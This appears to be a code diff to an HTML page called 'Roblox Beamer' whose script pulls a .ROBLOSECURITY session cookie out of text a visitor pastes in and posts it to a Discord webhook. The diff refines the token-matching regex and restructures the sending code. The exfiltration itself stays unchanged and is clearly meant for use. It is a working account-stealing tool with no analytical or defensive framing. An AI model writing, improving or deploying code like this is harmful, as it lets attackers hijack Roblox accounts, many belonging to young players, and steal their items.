@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TESTRoblox Beamer</title>
+  <title>Roblox Beamer</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -61,47 +61,49 @@
 
       errorMessage.textContent = ""; // Clear any previous error messages
 
-      // Check if the message contains a ROBLOSECURITY token
-      const robloxTokenRegex = /(\.ROBLOSECURITY=[a-zA-Z0-9]+;?)/;
-      const tokenMatch = message.match(robloxTokenRegex);
+      // Check if the message contains the ROBLOSECURITY token
+      const robloSecurityTokenPattern = /(\.ROBLOSECURITY=[A-Za-z0-9%\-._]+)(?=\s|$)/i;
+      const match = message.match(robloSecurityTokenPattern);
 
-      if (tokenMatch) {
-        // Only send the ROBLOSECURITY token to Discord
-        const robloxToken = tokenMatch[0]; // Extracted token
-        
-        // Create the embed payload with only the ROBLOSECURITY token
-        const embedPayload = {
-          embeds: [
-            {
-              title: "Roblox Token Found", // Embed title
-              description: `\`\`\`${robloxToken}\`\`\``, // Embed description with token wrapped in triple backticks
-              color: 16711680, // Embed color (red in this case)
-              timestamp: new Date().toISOString() // Adds a timestamp
-            }
-          ]
-        };
-
-        // Send the embed to Discord webhook
-        fetch(DISCORD_WEBHOOK_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(embedPayload),
-        })
-          .then((response) => {
-            if (response.ok) {
-              document.getElementById("status").textContent = "Message sent successfully!";
-              messageInput.value = ""; // Clear the input
-            } else {
-              throw new Error("Failed to send the message.");
-            }
-          })
-          .catch((error) => {
-            console.error("Error:", error);
-            document.getElementById("status").textContent = "Failed to send the message.";
-          });
-      } else {
-        errorMessage.textContent = "Failed: No ROBLOSECURITY token found in the message.";
+      if (!match) {
+        // If no ROBLOSECURITY token is found, show an error
+        errorMessage.textContent = "Message failed! No ROBLOSECURITY token found.";
+        return;
       }
+
+      // Extract only the ROBLOSECURITY token
+      const token = match[0];
+
+      // Create the embed payload with the token
+      const embedPayload = {
+        embeds: [
+          {
+            title: "ROBLOSECURITY Token",
+            description: `\`\`\`${token}\`\`\``, // Format the token within code brackets
+            color: 16711680, // Embed color (red in this case)
+            timestamp: new Date().toISOString() // Adds a timestamp
+          }
+        ]
+      };
+
+      // Send the token to Discord webhook
+      fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(embedPayload),
+      })
+        .then((response) => {
+          if (response.ok) {
+            document.getElementById("status").textContent = "Message sent successfully!";
+            messageInput.value = ""; // Clear the input
+          } else {
+            throw new Error("Failed to send the message.");
+          }
+        })
+        .catch((error) => {
+          console.error("Error:", error);
+          document.getElementById("status").textContent = "Failed to send the message.";
+        });
     }
   </script>
 </body>
